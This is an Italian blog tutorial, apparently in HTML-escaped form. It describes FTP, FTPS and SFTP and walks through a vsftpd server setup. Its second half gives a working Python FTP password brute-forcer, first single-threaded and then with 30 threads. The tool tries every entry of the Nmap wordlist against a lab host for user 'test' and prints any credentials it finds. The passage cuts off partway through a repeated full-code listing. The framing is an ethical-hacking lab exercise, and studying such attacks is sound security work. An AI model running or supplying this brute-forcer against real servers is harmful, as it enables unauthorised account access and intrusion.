&lt;p&gt;È necessario distinguere però tra FTP attivo e passivo. Nella variante attiva è il client a stabilire la connessione, come spiegato, attraverso la porta 21 e a comunicare al server su quale porta lato cliente questo può inviare la propria risposta. Ma se il client è protetto da un firewall, allora il server non potrà inviare alcuna risposta in quanto tutte le connessioni esterne sono bloccate. Proprio per questi casi è stata sviluppata una modalità passiva, che prevede che sia il server a rendere nota la porta tramite la quale il client può creare il canale dati. In questo modo, essendo il client a iniziare la connessione, il firewall non blocca il trasferimento dei dati.
Il File Transfer Protocol dispone di vari comandi e codici di stato. Grazie a ben 32 comandi totali - non sempre necessariamente tutti implementati dal server - il client istruisce il server su qual è l’operazione desiderata:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;caricare o scaricare file&lt;/li&gt;
&lt;li&gt;organizzare cartelle&lt;/li&gt;
&lt;li&gt;cancellare file&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Il server risponde ogni volta con un codice di stato che serve a informare se il comando può essere eseguito o meno con successo.
Il File Transfer Protocol originale venne creato senza misure di sicurezza preventive. All’epoca Internet era ancora molto piccolo e la cybercriminalità non esisteva ancora. Ma col passare del tempo i rischi di sicurezza associati all’utilizzo del FTP sono diventati numerosi, venendo le informazioni trasmesse senza essere state precedentemente criptate.&lt;/p&gt;
&lt;p&gt;Perciò sono state sviluppate due varianti sicure, che da allora continuano a farsi concorrenza: FTPS e SFTP. La prima variante consiste nel FTP over SSL. La connessione viene stabilita utilizzando i Secure Socket Layers (SSL), ossia il Transport Layer Security (TLS), che serve a criptare lo scambio di dati.&lt;br&gt;
Il SSH File Transfer Protocol (SFTP), al contrario, utilizza il Secure Shell (SSH) per garantire una trasmissione sicura dei dati.&lt;/p&gt;
&lt;p&gt;Anche in questo caso la connessione è criptata. Ma mentre il FTPS necessita di due connessioni, al SFTP ne basta una sola. In compenso però bisogna utilizzare un programma aggiuntivo.
Vsftpd (acronimo di Very Secure FTP daemon) è un server FTP per sistemi simili a Unix, incluso Linux. È il server FTP predefinito nelle distribuzioni Linux Ubuntu, CentOS, Fedora, NimbleX, Slackware e RHEL. È concesso in licenza con GNU General Public License, supporta IPv6, TLS e FTPS.&lt;/p&gt;
&lt;p&gt;Ora che abbiamo compreso cos&amp;rsquo;è il protocollo FTP e a cosa serve, andiamo a vedere come configurare un server FTP con Linux.&lt;/p&gt;
&lt;h1 id=&#34;configurazione-di-un-server-ftp-con-vsftpd&#34;&gt;Configurazione di un Server FTP con Vsftpd&lt;/h1&gt;
&lt;p&gt;Il pacchetto vsftpd è disponibile nei repository standard. Esegui i seguenti comandi per installarlo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo apt update
$ sudo apt install vsftpd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Al termine dell&amp;rsquo;installazione, il servizio ftp verrà avviato automaticamente.  Stampa lo stato del servizio per confermare:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo systemctl status vsftpd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;È possibile configurare il server vsftpd modificando il file &lt;code&gt;/etc/vsftpd.conf&lt;/code&gt;. Il file di configurazione contiene la documentazione dettagliata per la maggior parte delle impostazioni. Visita la pagina ufficiale vsftpd per vedere tutte le opzioni disponibili.
Per iniziare, apri il file di configurazione vsftpd:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo nano /etc/vsftpd.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Per assicurarti che solo gli utenti locali possano connettersi al server FTP, cerca le direttive anonymous_enable e local_enable e assicurati che le tue impostazioni corrispondano alle seguenti righe:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;anonymous_enable&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;NO
local_enable&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;YES
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Creeremo un nuovo utente per testare il server FTP. Crea un nuovo utente chiamato newftpuser:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo adduser newftpuser
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Impostare la password utente quando richiesto. Aggiungere l&amp;rsquo;utente all&amp;rsquo;elenco degli utenti FTP consentiti:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;newftpuser&amp;#34;&lt;/span&gt; | sudo tee -a /etc/vsftpd.user_list
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Crea l&amp;rsquo;albero della directory FTP e imposta le autorizzazioni corrette:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo mkdir -p /home/newftpuser/ftp/upload
$ sudo chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;550&lt;/span&gt; /home/newftpuser/ftp
$ sudo chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;750&lt;/span&gt; /home/newftpuser/ftp/upload
$ sudo chown -R newftpuser: /home/newftpuser/ftp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Per il nostro fine vanno bene queste configurazioni, ma il file &lt;code&gt;/etc/vsftpd.conf&lt;/code&gt; ne ha moltre altre, quindi invito chi fosse interessato ad approfondire meglio l&amp;rsquo;argomento.&lt;/p&gt;
&lt;h1 id=&#34;brute-forcing-delle-credenziali-di-un-server-ftp-con-python&#34;&gt;Brute Forcing delle credenziali di un server FTP con Python&lt;/h1&gt;
&lt;p&gt;Useremo il modulo ftplib integrato in Python. Tuttavia, useremo colorama per stampare a colori in Python:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pip3 install colorama
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Inizia a scrivere il codice:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ftplib
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; colorama &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Fore, init &lt;span style=&#34;color:#75715e&#34;&gt;# for fancy colors, nothing else&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# init the console for colors (Windows)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# init()&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# hostname or IP address of the FTP server&lt;/span&gt;
host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.113&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# username of the FTP server, root as default for linux&lt;/span&gt;
user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# port of FTP, aka 21&lt;/span&gt;
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Quindi il server locale si trova a 192.168.1.113, ho creato anche un nome utente &amp;ldquo;test&amp;rdquo;, e poi specifichiamo la porta dell&amp;rsquo;FTP, che è la 21.&lt;/p&gt;
&lt;p&gt;Ora scriviamo la funzione principale che accetta una password negli argomenti e restituisce se le credenziali sono corrette:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_correct&lt;/span&gt;(password):
    &lt;span style=&#34;color:#75715e&#34;&gt;# initialize the FTP server object&lt;/span&gt;
    server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FTP()
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Trying&amp;#34;&lt;/span&gt;, password)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        &lt;span style=&#34;color:#75715e&#34;&gt;# tries to connect to FTP server with a timeout of 5&lt;/span&gt;
        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
        &lt;span style=&#34;color:#75715e&#34;&gt;# login using the credentials (user &amp;amp; password)&lt;/span&gt;
        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(user, password)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error_perm:
        &lt;span style=&#34;color:#75715e&#34;&gt;# login failed, wrong credentials&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#75715e&#34;&gt;# correct credentials&lt;/span&gt;
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Found credentials:&amp;#34;&lt;/span&gt;, password, Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Niente di speciale; inizializziamo l&amp;rsquo;oggetto server FTP usando ftplib.FTP() e poi ci connettiamo a quell&amp;rsquo;host e proviamo ad accedere, questo solleverà un&amp;rsquo;eccezione ogni volta che le credenziali non sono corrette, quindi se viene sollevata, restituiremo solo False e True altrimenti.&lt;/p&gt;
&lt;p&gt;Useremo un elenco di password conosciute. Sentiti libero di usarne uno qualsiasi, oppure puoi generare il tuo elenco di parole personalizzato usando Crunch. Tuttavia, utilizzeremo l&amp;rsquo;elenco delle password di Nmap che contiene circa 5000 password. Se sei su Kali Linux, si trova in &amp;ldquo;/usr/share/wordlists/nmap.lst&amp;rdquo;. Altrimenti, prendilo &lt;a href=&#34;https://github.com/x4nth055/pythoncode-tutorials/blob/master/ethical-hacking/ftp-cracker/wordlist.txt&#34;&gt;qui&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Una volta che lo hai, mettilo nella directory corrente e chiamalo wordlist.txt e usa il seguente codice:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# read the wordlist of passwords&lt;/span&gt;
passwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wordlist.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Passwords to try:&amp;#34;&lt;/span&gt;, len(passwords))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora tutto ciò che dobbiamo fare è eseguire la funzione di cui sopra su tutte queste password:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# iterate over passwords one by one&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# if the password is found, break out of the loop&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; passwords:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; is_correct(password):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora, questo codice va bene, ma è molto lento. Utilizza un solo thread che tenta in sequenza una connessione FTP su ciascuna password.&lt;/p&gt;
&lt;p&gt;Usiamo i thread per accelerare questo processo; il seguente codice è quello completo che utilizza il multi-threading:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ftplib
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; threading &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Thread
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; queue
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; colorama &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Fore, init &lt;span style=&#34;color:#75715e&#34;&gt;# for fancy colors, nothing else&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# init the console for colors (for Windows)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# init()&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# initialize the queue&lt;/span&gt;
q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; queue&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Queue()
&lt;span style=&#34;color:#75715e&#34;&gt;# number of threads to spawn&lt;/span&gt;
n_threads &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# hostname or IP address of the FTP server&lt;/span&gt;
host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.113&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# username of the FTP server, root as default for linux&lt;/span&gt;
user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# port of FTP, aka 21&lt;/span&gt;
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;connect_ftp&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; q
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
        &lt;span style=&#34;color:#75715e&#34;&gt;# get the password from the queue&lt;/span&gt;
        password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
        &lt;span style=&#34;color:#75715e&#34;&gt;# initialize the FTP server object&lt;/span&gt;
        server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FTP()
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Trying&amp;#34;&lt;/span&gt;, password)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
            &lt;span style=&#34;color:#75715e&#34;&gt;# tries to connect to FTP server with a timeout of 5&lt;/span&gt;
            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
            &lt;span style=&#34;color:#75715e&#34;&gt;# login using the credentials (user &amp;amp; password)&lt;/span&gt;
            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(user, password)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error_perm:
            &lt;span style=&#34;color:#75715e&#34;&gt;# login failed, wrong credentials&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#75715e&#34;&gt;# correct credentials&lt;/span&gt;
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Found credentials: &amp;#34;&lt;/span&gt;)
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Host: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;host&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;User: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;user&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Password: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
            &lt;span style=&#34;color:#75715e&#34;&gt;# we found the password, let&amp;#39;s clear the queue&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mutex:
                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;queue&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;clear()
                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;all_tasks_done&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;notify_all()
                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unfinished_tasks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;finally&lt;/span&gt;:
            &lt;span style=&#34;color:#75715e&#34;&gt;# notify the queue that the task is completed for this password&lt;/span&gt;
            q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;task_done()

&lt;span style=&#34;color:#75715e&#34;&gt;# read the wordlist of passwords&lt;/span&gt;
passwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wordlist.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Passwords to try:&amp;#34;&lt;/span&gt;, len(passwords))
&lt;span style=&#34;color:#75715e&#34;&gt;# put all passwords to the queue&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; passwords:
    q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;put(password)
&lt;span style=&#34;color:#75715e&#34;&gt;# create `n_threads` that runs that function&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(n_threads):
    thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;connect_ftp)
    &lt;span style=&#34;color:#75715e&#34;&gt;# will end when the main thread end&lt;/span&gt;
    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;daemon &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
&lt;span style=&#34;color:#75715e&#34;&gt;# wait for the queue to be empty&lt;/span&gt;
q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Fantastico, è abbastanza simile al precedente, ma qui stiamo usando una coda che all&amp;rsquo;inizio è riempita con l&amp;rsquo;elenco delle password, e nella funzione principale che viene eseguita da quei thread daemon, otteniamo una password dal coda e prova ad accedere con esso. Se la password è corretta, dobbiamo terminare la forzatura bruta, un modo sicuro per farlo è cancellare la coda, ed è quello che stiamo facendo.&lt;/p&gt;
&lt;p&gt;Abbiamo anche utilizzato i thread daemon, quindi questi thread termineranno al termine del thread principale.&lt;/p&gt;
&lt;p&gt;Ecco il codice completo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ftplib
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; colorama &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Fore, init &lt;span style=&#34;color:#75715e&#34;&gt;# for fancy colors, nothing else&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# init the console for colors (for Windows)&lt;/span&gt;
init()
&lt;span style=&#34;color:#75715e&#34;&gt;# hostname or IP address of the FTP server&lt;/span&gt;
host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.113&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# username of the FTP server, root as default for linux&lt;/span&gt;
user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# port of FTP, aka 21&lt;/span&gt;
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_correct&lt;/span&gt;(password):
    &lt;span style=&#34;color:#75715e&#34;&gt;# initialize the FTP server object&lt;/span&gt;
    server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FTP()
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Trying&amp;#34;&lt;/span&gt;, password)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        &lt;span style=&#34;color:#75715e&#34;&gt;# tries to connect to FTP server with a timeout of 5&lt;/span&gt;
        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
        &lt;span style=&#34;color:#75715e&#34;&gt;# login using the credentials (user &amp;amp; password)&lt;/span&gt;
        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(user, password)
